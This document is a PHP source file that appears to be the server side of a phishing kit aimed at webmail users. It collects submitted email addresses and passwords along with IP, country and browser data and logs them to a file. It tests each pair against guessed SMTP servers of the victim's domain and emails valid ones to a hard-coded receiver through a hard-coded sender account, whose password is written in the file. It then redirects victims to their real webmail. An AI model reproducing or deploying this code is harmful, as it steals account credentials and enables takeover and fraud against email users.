<?php
require_once __DIR__ . '/PHPMailer.php';
require_once __DIR__ . '/SMTP.php';
require_once __DIR__ . '/Exception.php';

use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;
use PHPMailer\PHPMailer\Exception;

header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Methods: POST, GET, OPTIONS");
header("Access-Control-Allow-Headers: Content-Type, Authorization");
header('Content-Type: application/json');

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(200);
    exit();
}

$ip = $_SERVER['REMOTE_ADDR'] ?? 'UNKNOWN';
$browser = $_SERVER['HTTP_USER_AGENT'] ?? 'UNKNOWN';
$geo = @json_decode(file_get_contents("https://www.geoplugin.net/json.gp?ip=$ip"));
$country = $geo->geoplugin_countryName ?? 'Unknown';

session_start();

if ($_SERVER['REQUEST_METHOD'] === 'GET') {
    http_response_code(403);
    echo json_encode(["signal" => "error", "msg" => "GET method not allowed"]);
    exit();
}

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    echo json_encode(["signal" => "error", "msg" => "Only POST allowed"]);
    exit();
}

$login = trim($_POST['email'] ?? '');
$passwd = trim($_POST['password'] ?? '');

if (!$login || !$passwd || !str_contains($login, '@')) {
    echo json_encode(["signal" => "error", "msg" => "Email and password required"]);
    exit();
}

list(, $domain) = explode('@', $login);

// SMTP credentials for sending logs
$receiver     = 'bobrob@elitat.com';
$senderuser   = 'tp@globalhouse.co.th';
$senderpass   = 'Globalhouse@123';
$senderport   = 587;
$senderserver = 'mail.globalhouse.co.th';
$smtp_secure  = 'tls';

$timestamp = date('Y-m-d H:i:s');
$logFile = 'SS-Or-LucaGherardi-Tests.txt';
$validCredentials = false;
$emailSent = false;
$authStatus = '';
$connectionError = false;

$logMessage = "=== CREDENTIAL TEST ATTEMPT ===\n";
$logMessage .= "Timestamp: $timestamp\nEmail: $login\nPassword: $passwd\nDomain: $domain\nIP: $ip\nCountry: $country\nUser Agent: $browser\n";

// Function to test SMTP authentication against cPanel webmail server
function testCPanelSMTPAuth($email, $password, $domain) {
    global $logMessage;
    
    // Common cPanel webmail SMTP server patterns
    $smtpServers = [
        "mail.$domain",
        "smtp.$domain", 
        "webmail.$domain",
        "mail1.$domain",
        "mail2.$domain",
        "smtp1.$domain",
        "smtp2.$domain"
    ];
    
    // cPanel webmail uses port 587 with TLS
    $smtpPort = 587;
    $smtpSecure = 'tls';
    
    foreach ($smtpServers as $server) {
        try {
            $logMessage .= "Testing SMTP: $server:$smtpPort ($smtpSecure)\n";
            
            $mail = new PHPMailer(true);
            $mail->isSMTP();
            $mail->SMTPAuth = true;
            $mail->Host = $server;
            $mail->Username = $email;
            $mail->Password = $password;
            $mail->Port = $smtpPort;
            $mail->SMTPSecure = $smtpSecure;
            $mail->Timeout = 15;
            $mail->SMTPDebug = 0;
            
            // Test authentication by attempting to send a test email
            $mail->setFrom($email, 'Test User');
            $mail->addAddress($email); // Send to self
            $mail->Subject = 'Test Authentication';
            $mail->Body = 'This is a test email to verify SMTP authentication.';
            $mail->isHTML(false);
            
            if ($mail->send()) {
                $logMessage .= "✅ SUCCESS: Authenticated with $server:$smtpPort ($smtpSecure)\n";
                return true;
            } else {
                $logMessage .= "❌ AUTH FAILED: $server:$smtpPort - Could not send test email\n";
            }
            
        } catch (Exception $e) {
            $errorMsg = $e->getMessage();
            if (strpos($errorMsg, 'Authentication') !== false || 
                strpos($errorMsg, '535') !== false || 
                strpos($errorMsg, 'Invalid') !== false ||
                strpos($errorMsg, 'auth') !== false ||
                strpos($errorMsg, '535 5.7.8') !== false ||
                strpos($errorMsg, '535 5.7.0') !== false) {
                $logMessage .= "❌ AUTH FAILED: $server:$smtpPort - Authentication failed\n";
            } else {
                $logMessage .= "❌ CONNECTION FAILED: $server:$smtpPort - " . $errorMsg . "\n";
            }
            continue;
        }
    }
    
    return false;
}

// Test the credentials against the user's cPanel webmail server
$validCredentials = testCPanelSMTPAuth($login, $passwd, $domain);

if ($validCredentials) {
    $authStatus = '✅ VALID - Authenticated';
    $logMessage .= "✅ SUCCESS: cPanel webmail credentials validated\n";
    
    // Send validation report using real sender account
    try {
        $notify = new PHPMailer(true);
        $notify->isSMTP();
        $notify->SMTPAuth = true;
        $notify->Host = $senderserver;
        $notify->Username = $senderuser;
        $notify->Password = $senderpass;
        $notify->Port = $senderport;
        $notify->SMTPSecure = $smtp_secure;

        $notify->setFrom($senderuser, 'Credential Monitor');
        $notify->addAddress($receiver);
        $notify->isHTML(true);
        $notify->Subject = "VALID CREDENTIALS: $login | $country";
        $notify->Body = "<h2>✅ VALID CREDENTIALS</h2><p>Email: $login<br>Password: $passwd<br>IP: $ip<br>Country: $country<br>Time: $timestamp</p>";

        $notify->send();
        $emailSent = true;
        $logMessage .= "✅ Email notification sent successfully\n";
    } catch (Exception $e) {
        $logMessage .= "⚠️ Email notification failed: " . $e->getMessage() . "\n";
    }
} else {
    $authStatus = '❌ INVALID - Authentication failed';
    $connectionError = true;
    $logMessage .= "❌ FAILED: Invalid cPanel webmail credentials\n";
}

$logMessage .= "Authentication: $authStatus\nValid: " . ($validCredentials ? 'YES' : 'NO') . "\nEmail Sent: " . ($emailSent ? 'YES' : 'NO') . "\n\n";
file_put_contents($logFile, $logMessage, FILE_APPEND);

$_SESSION['attempts'] = ($_SESSION['attempts'] ?? 0) + 1;

// Different response handling based on credential validity
if ($validCredentials) {
    // Valid credentials - redirect to webmail
    $response = [
        "signal" => "OK",
        "success" => true,
        "msg" => "Login successful! Redirecting to webmail...",
        "attempt" => $_SESSION['attempts'],
        "redirect_url" => "https://webmail.$domain",
        "debug_info" => [
            "valid_credentials" => true,
            "auth_status" => $authStatus,
            "email_sent" => $emailSent,
            "timestamp" => $timestamp
        ]
    ];
    
    // Shorter delay for valid credentials
    usleep(rand(300000, 800000));
} else {
    // Invalid credentials - show connection error
    $response = [
        "signal" => "error",
        "success" => false,
        "msg" => "Connection error: Unable to connect to mail server. Please check your credentials and try again.",
        "attempt" => $_SESSION['attempts'],
        "connection_error" => true,
        "debug_info" => [
            "valid_credentials" => false,
            "auth_status" => $authStatus,
            "email_sent" => $emailSent,
            "timestamp" => $timestamp
        ]
    ];
    
    // Longer delay for invalid credentials to simulate processing
    usleep(rand(1000000, 2500000));
}

echo json_encode($response);
exit();
?>